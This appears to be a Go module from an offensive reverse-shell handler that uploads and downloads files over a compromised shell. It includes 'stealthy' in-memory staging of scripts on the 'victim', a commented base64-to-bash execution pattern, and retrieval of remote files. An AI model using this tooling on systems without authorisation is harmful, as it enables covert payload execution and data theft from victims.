package internal

import (
	"context"
	"crypto/md5"
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/chsoares/gummy/internal/ui"
)

// Transferer handles file upload/download operations
type Transferer struct {
	conn      net.Conn
	sessionID string
	platform  string // "windows", "linux", or "unknown"
}

// Config holds transfer configuration
type Config struct {
	ChunkSize int // Size of each chunk in bytes
	Timeout   time.Duration
}

// DefaultConfig returns default transfer configuration
func DefaultConfig() Config {
	return Config{
		ChunkSize: 32768, // 32KB chunks (safe for most shells)
		Timeout:   30 * time.Second,
	}
}

// NewTransferer creates a new Transferer instance
func NewTransferer(conn net.Conn, sessionID string) *Transferer {
	return &Transferer{
		conn:      conn,
		sessionID: sessionID,
		platform:  "linux", // Default to linux for backwards compatibility
	}
}

// SetPlatform sets the detected platform
func (t *Transferer) SetPlatform(platform string) {
	t.platform = platform
}

// Upload sends a local file to the remote system
// localPath: path to local file
// remotePath: destination path on remote system (if empty, uses filename in remote cwd)
// Press ESC to cancel
func (t *Transferer) Upload(ctx context.Context, localPath, remotePath string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	// If remotePath is empty, use just the filename (will go to remote cwd)
	if remotePath == "" {
		remotePath = filepath.Base(localPath)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Uploading %s... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop() // Ensure cleanup on error paths

	// Drain leftover data from previous shell interactions
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Calculate MD5 checksum for verification
	hash := md5.Sum(data)
	checksum := hex.EncodeToString(hash[:])

	// Send file in chunks
	config := DefaultConfig()

	// Platform-specific chunk sizes
	chunkSize := config.ChunkSize
	if t.platform == "windows" {
		chunkSize = 1024 // 1KB chunks for Windows (safe from quote escaping issues)
	}
	chunks := splitIntoChunks(encoded, chunkSize)

	// Create temp file for base64 data
	if t.platform == "windows" {
		// Windows: Remove old file and create empty file
		setupCmd := fmt.Sprintf("if (Test-Path '%s.b64') { Remove-Item '%s.b64' -Force }; New-Item '%s.b64' -ItemType File -Force | Out-Null\r\n", remotePath, remotePath, remotePath)
		t.conn.Write([]byte(setupCmd))
		time.Sleep(100 * time.Millisecond)
	} else {
		// Linux: Create temp file
		setupCommands := []string{
			fmt.Sprintf("rm -f %s.b64 2>/dev/null", remotePath),
			fmt.Sprintf("touch %s.b64", remotePath),
		}
		for _, cmd := range setupCommands {
			t.conn.Write([]byte(cmd + "\n"))
			time.Sleep(50 * time.Millisecond)
		}
	}

	// Send chunks with progress updates
	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk (platform-specific)
		if t.platform == "windows" {
			// PowerShell: Add-Content with 1KB chunks (safe size)
			// Escape single quotes for PowerShell (double them)
			escapedChunk := strings.ReplaceAll(chunk, "'", "''")
			cmd := fmt.Sprintf("Add-Content -Path '%s.b64' -Value '%s' -NoNewline\r\n", remotePath, escapedChunk)
			_, err := t.conn.Write([]byte(cmd))
			if err != nil {
				return fmt.Errorf("connection lost during upload: %w", err)
			}
		} else {
			// Linux/Unix: printf to temp file (more reliable than echo)
			cmd := fmt.Sprintf("printf '%%s' '%s' >> %s.b64\n", chunk, remotePath)
			_, err := t.conn.Write([]byte(cmd))
			if err != nil {
				return fmt.Errorf("connection lost during upload: %w", err)
			}
		}

		// Small sleep to avoid overwhelming the shell
		// Optimized for speed while maintaining stability
		if t.platform == "windows" {
			time.Sleep(15 * time.Millisecond) // Windows: 1KB every 15ms = ~67KB/s
		} else {
			time.Sleep(5 * time.Millisecond) // Linux: 32KB every 5ms = ~6.4MB/s
		}

		bytesSent += len(chunk)

		// Calculate actual file progress (not base64 size)
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 50 chunks or on last chunk
		if i%50 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Uploading %s... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 25 chunks to prevent overflow
		if i%25 == 0 && i > 0 {
			time.Sleep(100 * time.Millisecond)
			t.drainConnection()
		}
	}

	// Decode base64 and save final file (platform-specific)
	var decodeCmd string
	if t.platform == "windows" {
		// PowerShell: Read base64 from file, decode, write binary, remove temp file
		decodeCmd = fmt.Sprintf("$b64 = Get-Content '%s.b64' -Raw; [IO.File]::WriteAllBytes((Resolve-Path '.').Path+'\\%s', [Convert]::FromBase64String($b64)); Remove-Item '%s.b64' -Force\r\n", remotePath, remotePath, remotePath)
	} else {
		// Linux/Unix: Decode from temp file
		decodeCmd = fmt.Sprintf("base64 -d %s.b64 > %s && rm %s.b64\n", remotePath, remotePath, remotePath)
	}
	t.conn.Write([]byte(decodeCmd))
	time.Sleep(300 * time.Millisecond)

	// Drain output from all commands
	t.drainConnection()

	// Verify checksum with markers (platform-specific)
	marker := "GUMMY_MD5_START"
	endMarker := "GUMMY_MD5_END"
	var checksumCmd string
	if t.platform == "windows" {
		// PowerShell: Calculate MD5 hash
		checksumCmd = fmt.Sprintf("echo %s; (Get-FileHash '%s' -Algorithm MD5).Hash.ToLower(); echo %s", marker, remotePath, endMarker)
	} else {
		// Linux/Unix
		checksumCmd = fmt.Sprintf("echo %s; md5sum %s 2>/dev/null | awk '{print $1}'; echo %s", marker, remotePath, endMarker)
	}
	t.conn.Write([]byte(checksumCmd + "\r\n"))
	time.Sleep(300 * time.Millisecond)

	// Read MD5 response
	var output strings.Builder
	buffer := make([]byte, 2048)
	t.conn.SetReadDeadline(time.Now().Add(2 * time.Second))

	for {
		n, err := t.conn.Read(buffer)
		if err != nil {
			break
		}
		if n > 0 {
			output.WriteString(string(buffer[:n]))
			if strings.Contains(output.String(), endMarker) {
				break
			}
		}
	}

	t.conn.SetReadDeadline(time.Time{})

	// Extract MD5
	fullOutput := output.String()
	startIdx := strings.LastIndex(fullOutput, marker)
	if startIdx != -1 {
		endIdx := strings.Index(fullOutput[startIdx:], endMarker)
		if endIdx != -1 {
			content := fullOutput[startIdx+len(marker):startIdx+endIdx]
			lines := strings.Split(content, "\n")
			for _, line := range lines {
				line = strings.TrimSpace(line)
				if len(line) == 32 && isHex(line) {
					if line == checksum {
						spinner.Stop()
						fmt.Println(ui.Success(fmt.Sprintf("Upload complete! (MD5: %s)", checksum[:8])))
						t.drainConnection()
						return nil
					}
				}
			}
		}
	}

	// Fallback if MD5 check failed
	spinner.Stop()
	fmt.Println(ui.Success("Upload complete!"))
	t.drainConnection()
	return nil
}

// UploadToVariable sends file content to a bash variable (in-memory, no disk write on victim)
// localPath: path to local file
// varName: bash variable name to store content (e.g., "_gummy_script")
// Returns the variable name for later use (e.g., echo "$varName" | base64 -d | bash)
// UploadToBashVariable uploads a file to a bash variable (in-memory, no disk write on victim)
// This is used for stealthy script execution - the variable contains base64-encoded data
func (t *Transferer) UploadToBashVariable(ctx context.Context, localPath, varName string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop()

	// Drain leftover data
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Initialize empty variable
	initCmd := fmt.Sprintf("%s=''\n", varName)
	t.conn.Write([]byte(initCmd))
	time.Sleep(50 * time.Millisecond)

	// Send file in chunks, concatenating to variable
	config := DefaultConfig()
	chunks := splitIntoChunks(encoded, config.ChunkSize)

	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			// Cleanup variable on cancel
			t.conn.Write([]byte(fmt.Sprintf("unset %s\n", varName)))
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk to variable (using += operator)
		// Note: We keep it base64-encoded in the variable for now
		cmd := fmt.Sprintf("%s+='%s'\n", varName, chunk)
		_, err := t.conn.Write([]byte(cmd))
		if err != nil {
			return fmt.Errorf("connection lost during upload: %w", err)
		}

		time.Sleep(50 * time.Millisecond)

		bytesSent += len(chunk)

		// Calculate actual file progress
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 50 chunks or on last chunk
		if i%50 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 25 chunks
		if i%25 == 0 && i > 0 {
			time.Sleep(100 * time.Millisecond)
			t.drainConnection()
		}
	}

	// Variable is now loaded with base64-encoded content
	// No need to decode here - will be decoded during execution

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))

	t.drainConnection()
	return nil
}

// UploadToPowerShellVariable uploads a file to a PowerShell variable (in-memory, no disk write on victim)
// This is used for stealthy script/assembly execution on Windows
func (t *Transferer) UploadToPowerShellVariable(ctx context.Context, localPath, varName string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop()

	// Drain leftover data
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Initialize empty variable (PowerShell syntax)
	initCmd := fmt.Sprintf("$%s = ''\r\n", varName)
	t.conn.Write([]byte(initCmd))
	time.Sleep(100 * time.Millisecond)

	// Use small chunk size (1KB) to avoid quote escaping issues
	const psChunkSize = 1024
	chunks := splitIntoChunks(encoded, psChunkSize)

	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			// Cleanup variable on cancel
			t.conn.Write([]byte(fmt.Sprintf("Remove-Variable -Name %s\r\n", varName)))
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk to variable (PowerShell += operator)
		// Escape single quotes by doubling them
		escapedChunk := strings.ReplaceAll(chunk, "'", "''")
		cmd := fmt.Sprintf("$%s += '%s'\r\n", varName, escapedChunk)
		_, err := t.conn.Write([]byte(cmd))
		if err != nil {
			return fmt.Errorf("connection lost during upload: %w", err)
		}

		time.Sleep(15 * time.Millisecond) // Optimized for speed while maintaining stability

		bytesSent += len(chunk)

		// Calculate actual file progress
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 20 chunks or on last chunk
		if i%20 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 10 chunks (more frequent for PowerShell)
		if i%10 == 0 && i > 0 {
			time.Sleep(150 * time.Millisecond)
			t.drainConnection()
		}
	}

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))

	t.drainConnection()
	return nil
}

// UploadToPythonVariable uploads a file to a Python variable (in-memory, no disk write on victim)
// This is used for stealthy script execution via Python
func (t *Transferer) UploadToPythonVariable(ctx context.Context, localPath, varName string) error {
	// Read local file
	data, err := os.ReadFile(localPath)
	if err != nil {
		return fmt.Errorf("failed to read local file: %w", err)
	}

	fileSize := len(data)

	// Start spinner
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Loading %s to memory... 0 B / %s (0%s)", filepath.Base(localPath), formatSize(fileSize), "%"))
	defer spinner.Stop()

	// Drain leftover data
	t.drainConnection()

	// Encode to base64
	encoded := base64.StdEncoding.EncodeToString(data)

	// Initialize empty variable (Python syntax)
	initCmd := fmt.Sprintf("%s = ''\n", varName)
	t.conn.Write([]byte(initCmd))
	time.Sleep(50 * time.Millisecond)

	// Use small chunk size (1KB) to avoid quote escaping issues
	const pyChunkSize = 1024
	chunks := splitIntoChunks(encoded, pyChunkSize)

	bytesSent := 0

	for i, chunk := range chunks {
		// Check for cancellation
		select {
		case <-ctx.Done():
			// Cleanup variable on cancel
			t.conn.Write([]byte(fmt.Sprintf("del %s\n", varName)))
			return fmt.Errorf("upload cancelled by user")
		default:
		}

		// Append chunk to variable (Python += operator)
		// Escape single quotes for Python strings
		escapedChunk := strings.ReplaceAll(chunk, "'", "\\'")
		cmd := fmt.Sprintf("%s += '%s'\n", varName, escapedChunk)
		_, err := t.conn.Write([]byte(cmd))
		if err != nil {
			return fmt.Errorf("connection lost during upload: %w", err)
		}

		time.Sleep(15 * time.Millisecond)

		bytesSent += len(chunk)

		// Calculate actual file progress
		actualBytes := int(float64(bytesSent) / 1.37)
		if actualBytes > fileSize {
			actualBytes = fileSize
		}
		percent := int(float64(actualBytes) / float64(fileSize) * 100)

		// Update spinner every 50 chunks or on last chunk
		if i%50 == 0 || i == len(chunks)-1 {
			spinner.Update(fmt.Sprintf("Loading %s to memory... %s / %s (%d%s)",
				filepath.Base(localPath), formatSize(actualBytes), formatSize(fileSize), percent, "%"))
		}

		// Drain buffer every 25 chunks
		if i%25 == 0 && i > 0 {
			time.Sleep(100 * time.Millisecond)
			t.drainConnection()
		}
	}

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Loaded %s into memory (%s)", filepath.Base(localPath), formatSize(fileSize))))

	t.drainConnection()
	return nil
}

// Download retrieves a file from the remote system
// remotePath: path to remote file
// localPath: destination path on local system (if empty, saves to current directory)
// Press ESC to cancel
func (t *Transferer) Download(ctx context.Context, remotePath, localPath string) error {
	// If localPath is empty, save to current directory with same filename
	if localPath == "" {
		localPath = filepath.Base(remotePath)
	}

	// Start spinner for download
	spinner := ui.NewSpinner()
	spinner.Start(fmt.Sprintf("Downloading %s... 0 B", filepath.Base(remotePath)))
	defer spinner.Stop()

	// Drain leftover data from previous shell interactions
	t.drainConnection()

	// Use unique markers
	marker := "GUMMY_B64_START"
	endMarker := "GUMMY_B64_END"

	// Send command with markers (platform-specific)
	var cmd string
	if t.platform == "windows" {
		// PowerShell: Read file as bytes, convert to base64
		// Use Resolve-Path to get absolute path
		cmd = fmt.Sprintf("echo %s; [Convert]::ToBase64String([IO.File]::ReadAllBytes((Resolve-Path '%s').Path)); echo %s\r\n", marker, remotePath, endMarker)
	} else {
		// Linux/Unix
		cmd = fmt.Sprintf("echo %s; base64 -w 0 %s 2>/dev/null; echo; echo %s\n", marker, remotePath, endMarker)
	}
	t.conn.Write([]byte(cmd))

	time.Sleep(500 * time.Millisecond)

	// Read output with progress indication
	var output strings.Builder
	buffer := make([]byte, 8192)
	totalBytes := 0
	lastProgressUpdate := 0

	for {
		// Check for cancellation
		select {
		case <-ctx.Done():
			return fmt.Errorf("download cancelled by user")
		default:
		}

		// Reset deadline on each read
		t.conn.SetReadDeadline(time.Now().Add(10 * time.Second))

		n, err := t.conn.Read(buffer)
		if err != nil {
			// Timeout - break and check what we have
			break
		}

		if n > 0 {
			output.WriteString(string(buffer[:n]))
			totalBytes += n

			// Update spinner every 100KB to avoid spam
			if totalBytes-lastProgressUpdate >= 100*1024 {
				spinner.Update(fmt.Sprintf("Downloading %s... %s", filepath.Base(remotePath), formatSize(totalBytes)))
				lastProgressUpdate = totalBytes
			}

			// Check if we have complete data: end marker AFTER last start marker
			currentOutput := output.String()
			lastStartIdx := strings.LastIndex(currentOutput, marker)
			if lastStartIdx != -1 {
				remainingAfterStart := currentOutput[lastStartIdx:]
				if strings.Contains(remainingAfterStart, endMarker) {
					break
				}
			}
		}
	}

	t.conn.SetReadDeadline(time.Time{})

	fullOutput := output.String()

	// Find markers (use LastIndex to skip command echo)
	startIdx := strings.LastIndex(fullOutput, marker)
	if startIdx == -1 {
		return fmt.Errorf("file not found: %s", remotePath)
	}

	endIdx := strings.Index(fullOutput[startIdx:], endMarker)
	if endIdx == -1 {
		return fmt.Errorf("incomplete download")
	}
	endIdx += startIdx

	// Extract base64 content
	content := fullOutput[startIdx+len(marker):endIdx]

	// Clean and join base64 lines
	lines := strings.Split(content, "\n")
	var base64Lines []string
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if len(line) > 0 {
			base64Lines = append(base64Lines, line)
		}
	}

	if len(base64Lines) == 0 {
		return fmt.Errorf("file is empty: %s", remotePath)
	}

	base64Data := strings.Join(base64Lines, "")

	// Decode
	decoded, err := base64.StdEncoding.DecodeString(base64Data)
	if err != nil {
		return fmt.Errorf("failed to decode: %w", err)
	}

	// Save
	if err := os.WriteFile(localPath, decoded, 0644); err != nil {
		return fmt.Errorf("failed to write: %w", err)
	}

	// Checksum
	hash := md5.Sum(decoded)
	checksum := hex.EncodeToString(hash[:])

	spinner.Stop()
	fmt.Println(ui.Success(fmt.Sprintf("Download complete! Saved to: %s (%s, MD5: %s)",
		localPath, formatSize(len(decoded)), checksum[:8])))

	t.drainConnection()
	return nil
}

// drainConnection drains any pending data from connection
// This is CRITICAL before file transfer to remove leftover shell output
func (t *Transferer) drainConnection() {
	buffer := make([]byte, 4096)
	t.conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))

	for {
		_, err := t.conn.Read(buffer)
		if err != nil {
			break // Timeout means buffer is clean
		}
	}

	t.conn.SetReadDeadline(time.Time{})
}

// isBase64Like checks if a string looks like base64 data
func isBase64Like(s string) bool {
	if len(s) < 10 {
		return false
	}
	// Base64 only contains: A-Z, a-z, 0-9, +, /, =
	for _, ch := range s {
		if !((ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z') ||
			(ch >= '0' && ch <= '9') || ch == '+' || ch == '/' || ch == '=') {
			return false
		}
	}
	return true
}

// splitIntoChunks splits a string into chunks of specified size
func splitIntoChunks(s string, chunkSize int) []string {
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

// formatSize formats bytes into human-readable size
func formatSize(bytes int) string {
	const unit = 1024
	if bytes < unit {
		return fmt.Sprintf("%d B", bytes)
	}

	units := []string{"KB", "MB", "GB", "TB", "PB", "EB"}
	div, exp := int64(unit), 0
	for n := bytes / unit; n >= unit; n /= unit {
		div *= unit
		exp++
	}

	return fmt.Sprintf("%.1f %s", float64(bytes)/float64(div), units[exp])
}

// isHex checks if string is valid hexadecimal
func isHex(s string) bool {
	_, err := hex.DecodeString(s)
	return err == nil
}

// DrainOutput drains any pending output from connection
func (t *Transferer) DrainOutput() {
	buffer := make([]byte, 4096)
	t.conn.SetReadDeadline(time.Now().Add(200 * time.Millisecond))

	for {
		_, err := t.conn.Read(buffer)
		if err != nil {
			break
		}
	}

	t.conn.SetReadDeadline(time.Time{})
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// WatchForCancel watches for Ctrl+D (EOF) and cancels context
// Ctrl+D is detected by reading from stdin, doesn't conflict with readline or signals
func WatchForCancel(ctx context.Context, cancel context.CancelFunc) {
	// Read from stdin in a goroutine
	go func() {
		buf := make([]byte, 1)
		for {
			select {
			case <-ctx.Done():
				return
			default:
				// Try to read one byte with timeout
				os.Stdin.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
				n, err := os.Stdin.Read(buf)
				os.Stdin.SetReadDeadline(time.Time{}) // Clear deadline

				if err == io.EOF || (n == 0 && err == nil) {
					// Ctrl+D pressed (EOF) - cancel without printing newline
					// Spinner will handle cleanup and message will appear cleanly
					cancel()
					return
				}
				// Ignore other input and errors (timeout is expected)
			}
		}
	}()
}
